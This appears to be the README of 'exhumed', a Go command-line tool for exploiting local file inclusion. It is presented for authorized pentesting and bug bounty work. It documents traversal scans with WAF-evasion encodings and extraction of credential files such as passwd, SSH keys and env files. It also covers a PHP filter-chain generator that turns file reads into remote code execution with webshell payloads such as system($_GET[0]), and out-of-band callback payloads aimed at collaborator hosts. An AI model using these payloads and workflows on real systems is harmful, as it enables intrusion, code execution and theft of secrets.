# exhumed

> *Some files don't stay buried.*

Modern LFI exploitation CLI and a revival of the abandoned `panoptic`.
Point it at a vulnerable parameter and it walks a curated database of
high-value file paths to find what's readable and extract content for
follow-on targeting...

---

> **LEGAL / ETHICAL USE NOTICE**
>
> `exhumed` is for **authorized security testing and bug bounty work only**.
> Using it against systems you do not have explicit, written permission to test
> is **illegal** and may violate computer fraud laws in your jurisdiction.
> You are solely responsible for ensuring your use complies with applicable law
> and the scope of any authorization you hold.
> The authors accept no liability for misuse.

---

## Status

**Under active development — pre-v1.0.** APIs and output formats may change
between packets. Do not depend on stability yet.

---

## Build from source

Requires Go 1.26+. No cgo. Produces a single static binary.

```bash
git clone https://github.com/bugsyhewitt/exhumed.git
cd exhumed

# plain build (version = dev)
CGO_ENABLED=0 go build -o exhumed ./cmd/exhumed

# release build with version metadata
CGO_ENABLED=0 go build \
  -ldflags "-X github.com/bugsyhewitt/exhumed/internal/version.Version=0.1.0 \
            -X github.com/bugsyhewitt/exhumed/internal/version.Commit=$(git rev-parse --short HEAD) \
            -X github.com/bugsyhewitt/exhumed/internal/version.Date=$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
  -o exhumed ./cmd/exhumed
```

---

## Usage (Packet 01 — evolving)

### `scan`

Fire traversal payloads at a vulnerable parameter. The URL must contain the
injection marker (default `FUZZ`):

```bash
# Basic scan against query parameter
exhumed scan --url "http://target.local/?file=FUZZ"

# POST body injection
exhumed scan --url "http://target.local/load" \
             --method POST \
             --data "path=FUZZ"

# Header injection
exhumed scan --url "http://target.local/read" \
             -H "X-Include-File: FUZZ"

# Cookie injection
exhumed scan --url "http://target.local/view" \
             -b "lfi_path=FUZZ"

# JSON body injection
exhumed scan --url "http://target.local/api/file" \
             --method POST \
             --data '{"path":"FUZZ"}' \
             -H "Content-Type: application/json"

# Tune concurrency, rate, and depth
exhumed scan --url "http://target.local/?file=FUZZ" \
             --concurrency 20 \
             --rate 50 \
             --traversal-depth 12 \
             --timeout 15s

# Verbose output (shows injection surface and payload preview)
exhumed scan --url "http://target.local/?file=FUZZ" --verbose

# Route through Burp Suite
exhumed scan --url "http://target.local/?file=FUZZ" \
             --proxy http://127.0.0.1:8080 \
             --insecure
```

### Selecting traversal techniques (WAF evasion)

By default `scan` fires every traversal/encoding technique it knows, ordered
most-to-least likely to succeed. When a target sits behind a WAF or an input
filter, you often want to either focus on the encodings that slip past that
specific filter or skip the noisy ones to cut request volume. `--techniques`
takes a comma-separated allowlist:

```bash
# Only the WAF-evasion encodings (mixed double-encoding, overlong slash,
# encoded backslash, dot-slash prefix, interstitial null)
exhumed scan --url "http://target.local/?file=FUZZ" \
             --techniques waf-double-slash,waf-overlong-slash,waf-encoded-backslash

# A single high-signal technique for a quick check
exhumed scan --url "http://target.local/?file=FUZZ" --techniques dotdot-slash

# List every available technique name, then exit
exhumed scan --url "http://target.local/?file=FUZZ" --techniques list
```

Available techniques fall into three groups:

| Group | Techniques |
|-------|-----------|
| Plain / encoded | `dotdot-slash`, `dotdot-backslash`, `dotdotdotdot-doubleslash`, `url-encoded`, `url-encoded-dots`, `url-encoded-slash`, `double-url-encoded`, `overlong-utf8`, `unicode-fullwidth`, `null-byte-percent`, `null-byte-raw`, `absolute-path` |
| WAF evasion | `waf-double-slash`, `waf-overlong-slash`, `waf-encoded-backslash`, `waf-dotslash-prefix`, `waf-null-interstitial` |
| Wrappers | `php-filter`, `file-uri` |

An unknown technique name is rejected with a clear error; an empty `--techniques`
(the default) means "use all". The selection preserves the generator's
most-to-least-likely ordering regardless of the order you list names in.

### Resumable scans

A full scan over a large database × many traversal techniques × traversal depth
is thousands of requests. If you Ctrl-C, hit a rate limit, or the target flaps,
`--resume` lets you pick up where you left off instead of re-hammering the target
from scratch — a scan-time *and* stealth win.

```bash
# Persist per-entry progress to a state file. Run it, interrupt it (Ctrl-C),
# then run the exact same command again — already-attempted entries are skipped
# and prior confirmed hits are replayed in the summary.
exhumed scan --url "http://target.local/?file=FUZZ" --resume scan.state

# Same command resumes; new run only scans what wasn't attempted yet.
exhumed scan --url "http://target.local/?file=FUZZ" --resume scan.state
```

The state file is bound to the `(target, marker, database)` triple it was created
against. Resuming with a different target, marker, or database is **refused**
(fail-closed) — otherwise the skip-set would silently hide entries that were never
actually attempted against the current scan. Delete the file to start fresh. State
is flushed atomically after every entry, so an interrupted scan never corrupts it.

### Scanning a custom wordlist (SecLists interop)

The curated database is the moat, but sometimes you have a target-specific or
community wordlist of candidate paths (a SecLists LFI list, paths harvested from
recon, an app's known config locations). `--paths-file` scans those paths
*alongside* the curated database, fed through the same traversal engine.

```bash
# Scan the curated database AND every path in the wordlist
exhumed scan --url "http://target.local/?file=FUZZ" \
             --paths-file ./SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
```

Wordlist format (matches SecLists and similar lists):

- one candidate file path per line
- blank lines are skipped
- lines starting with `#` are treated as comments
- duplicate paths are de-duplicated (first occurrence wins)

Each path becomes a synthetic entry with a *weak confirm* — any readable, non-
trivial `2xx` body counts as a hit — and the parser is inferred from the path
(`.env`/`.ini`/`.conf` → config, `passwd` → unix-passwd, `id_rsa` → ssh-key,
`environ` → proc-environ, otherwise generic secret scraping). The curated
database always runs first; the wordlist purely extends coverage. A missing or
unreadable wordlist file is a hard error, so you never silently scan the curated
set only. Combine with `--techniques` to keep request volume sane on large lists.

### Local testbed (deliberately vulnerable dev server)

```bash
# Start the testbed (localhost only, sandboxed fake filesystem)
go run ./testbed/server

# Then scan against it
exhumed scan --url "http://127.0.0.1:8080/?file=FUZZ" --verbose
```

### JSON output

Pass `--output json` to emit a single machine-readable JSON document instead of
the default human-readable text. The document is written to stdout after the scan
completes and is suitable for piping to `jq`, logging to SIEM, or feeding
downstream automation:

```bash
# Structured JSON output
exhumed scan --url "http://target.local/?file=FUZZ" --output json

# Pipe to jq for pretty inspection
exhumed scan --url "http://target.local/?file=FUZZ" --output json | jq '.hits[].findings'

# Extract confirmed file paths
exhumed scan --url "http://target.local/?file=FUZZ" --output json | jq -r '.hits[].path'

# Only emit secrets (filter in jq)
exhumed scan --url "http://target.local/?file=FUZZ" --output json --show-secrets \
  | jq '.hits[].findings[] | select(.type == "secret")'
```

The JSON schema is versioned (`schema_version: "1"`). Top-level fields:

| Field | Type | Description |
|---|---|---|
| `schema_version` | string | Format version for downstream parsers |
| `started_at` / `completed_at` | RFC3339 | Scan wall-clock times |
| `target` | string | The scanned URL |
| `total_requests` | int | HTTP requests fired |
| `confirmed_hits` | int | Files successfully read |
| `chain_targets_queued` | int | Follow-on paths generated |
| `hits` | array | Each confirmed hit with findings |

Each hit includes `entry_id`, `path`, `technique`, `status_code`, `elapsed_ms`,
`snippets`, `findings`, `chain` (bool), and `chain_depth`.

### PHP filter chains (RCE escalation)

A confirmed file-read is often only a step away from remote code execution.
When the target `include()`/`require()`s a parameter you control, the
**PHP filter chain** technique (loknop's research, popularised by synacktiv)
turns that read primitive into *arbitrary content*: chained `convert.iconv`
filters reconstruct a payload of your choosing — typically a PHP webshell — from
a resource whose original contents don't matter, and the `include()` sink then
executes it.

`exhumed payload php-filter` is a payload **generator**: it prints the
`php://filter/...` string and performs no network I/O. You place the string into
the vulnerable parameter yourself.

```bash
# Generate a chain that runs system($_GET[0]) on the target
exhumed payload php-filter --rce '<?php system($_GET[0]);?>'

# Short-tag webshell, custom sink resource (default is php://temp)
exhumed payload php-filter --rce '<?=`$_GET[0]`?>' --resource php://temp

# Then feed the printed chain to the vulnerable parameter, e.g.:
#   curl 'http://target.local/?file=php://filter/...&0=id'
```

The generated chain is **byte-for-byte identical** to synacktiv's reference
`php_filter_chain_generator` for the same payload (pinned by a golden test), and
the construction is pure-Go string assembly — no GPL dependencies, no PHP runtime
required to generate.

Debug / verification mode: pass a pre-encoded base64 payload with `--raw-base64`
and `--debug` to emit a chain that surfaces the *reconstructed base64* (omitting
the final decode) so you can confirm the chain rebuilds your bytes correctly on
the target before arming it:

```bash
exhumed payload php-filter --raw-base64 PD9waHAgcGhwaW5mbygpOz8+ --debug
```

### Out-of-band confirmation for blind LFI

`exhumed`'s detection is response-body pattern matching, so it cannot see a
**blind** sink — one that reads or `include()`s a file but never reflects its
contents in the HTTP response. `exhumed payload oob` generates out-of-band
payloads that force the target to make an outbound interaction (DNS, SMB, or
HTTP) to a collaborator domain you control. Observing that interaction at your
collaborator (interactsh, Burp Collaborator, a controlled DNS/HTTP log) proves
the sink fired even with an empty response.

Like the other `payload` subcommands, generation is pure: `exhumed payload oob`
prints the strings and performs no network I/O. You place each string into the
vulnerable parameter and correlate hits at your collaborator — either an
external one (interactsh, Burp Collaborator) or the **built-in listener**
described below.

```bash
exhumed payload oob --domain abc123.oast.fun
```

```
smb-unc        \\abc123.oast.fun\exhumed
http-wrapper   http://abc123.oast.fun/exhumed-oob
https-wrapper  https://abc123.oast.fun/exhumed-oob
dns-resolve    \\abc123.oast.fun\
```

Four techniques are emitted, most to least reliable:

| Technique | Payload shape | Fires when |
|-----------|---------------|-----------|
| `smb-unc` | `\\<domain>\<share>` | Windows `include()` / Java / .NET file APIs dereference UNC paths (SMB + DNS) |
| `http-wrapper` | `http://<domain>/...` | `allow_url_include` is on or the sink fetches URLs |
| `https-wrapper` | `https://<domain>/...` | egress only permits TLS fetches |
| `dns-resolve` | `\\<domain>\` | DNS lookup only — survives strict egress that blocks SMB/HTTP |

Pass `--label` to prepend a per-technique subdomain (`http.<domain>`,
`dns.<domain>`, …) so an observed interaction can be attributed to the technique
that triggered it, and `--json` for machine-readable output (value, technique,
subdomain, and a note describing each payload's precondition). `--share` and
`--path` customise the SMB share and the http(s) resource path.

```bash
exhumed payload oob --domain x.burpcollaborator.net --label --json
```

#### Built-in collaborator listener

`exhumed payload oob listen` runs a self-contained HTTP collaborator that records
the callbacks produced by the `http://` and `https://` OOB payloads — closing the
loop without an external service. When a blind sink dereferences a payload that
points at the listener, the request is captured and printed live, proving the
sink fired even with an empty target response. It makes no outbound calls and
needs no cgo, so it preserves the static-binary build.

```bash
exhumed payload oob listen --addr :8080
```

```
[*] OOB collaborator listening on http://0.0.0.0:8080/ (Ctrl-C to stop)
[hit #1] 21:10:36  203.0.113.7      http-wrapper  GET /exhumed-oob
[hit #2] 21:10:36  203.0.113.7      dns-resolve   GET /beacon
```

Each line shows the sequence number, time, the target's egress IP, the technique
(attributed via the request's leading `Host` subdomain when payloads were
generated with `--label`), the HTTP method, and the requested path. Press Ctrl-C
to stop; with `--json` a JSON array of every recorded interaction is written to
stdout on shutdown. Use `--addr :0` to bind an OS-assigned free port (printed on
startup).

The listener is intended for local and lab use where you control DNS for the
collaborator domain — or where you point payloads straight at its address. For
internet-facing blind testing, an external collaborator with a public resolver
remains the right tool; the built-in listener handles the SMB/DNS-only techniques
that an HTTP listener cannot observe.

```bash
# Generate http(s) payloads aimed at a domain that resolves to your listener,
# then run the listener to confirm callbacks:
exhumed payload oob --domain c.example.com --label
exhumed payload oob listen --addr :8080 --json
```

### Other commands

```bash
exhumed version          # print version, commit, date
exhumed version --db     # also print the active database version and source
exhumed update           # update file database (Packet 05 — stub for now)
exhumed --help
exhumed scan --help
```

`exhumed version --db` resolves the same database that `scan` and `db` would
load — the freshest of the bundled database and the feed cache — and prints its
version and source, so you can answer "am I current?" without running a scan:

```
exhumed dev (commit: none, built: unknown)
database 2026-05-20 (cache, /home/user/.cache/exhumed)
```

Database versions are compared with proper [semantic versioning](https://semver.org/)
(`golang.org/x/mod/semver`) when both versions are semver-shaped, so `1.10.0`
correctly outranks `1.9.0`. Date-based versions (`YYYY-MM-DD`) fall back to
lexicographic comparison, which is correct for fixed-width dates.

---

## Roadmap to v1.0

1. **Repo scaffold, HTTP engine, injection layer, traversal generator, testbed** ✅
2. **Versioned file database** — 150 curated high-value paths loaded from local files, spanning OS, web-server, framework, cloud, CI/CD, version-control, credential-store, and language-runtime targets ✅
3. **Remote feed** — `exhumed update` pulls the latest database from a versioned feed ✅
4. **Detection engine** — confirms successful inclusion via regex/keyword matching ✅
5. **Content extraction** — format-aware parsers (passwd, PHP config, env files, etc.) ✅
6. **Recursive follow-on chaining** — use extracted content to generate next targets ✅
7. **JSON-first output** — machine-readable results plus a human TTY mode ✅
8. **Single static binary release** — cross-compiled for Linux/macOS/Windows via GoReleaser

---

## License

MIT — see [LICENSE](LICENSE).
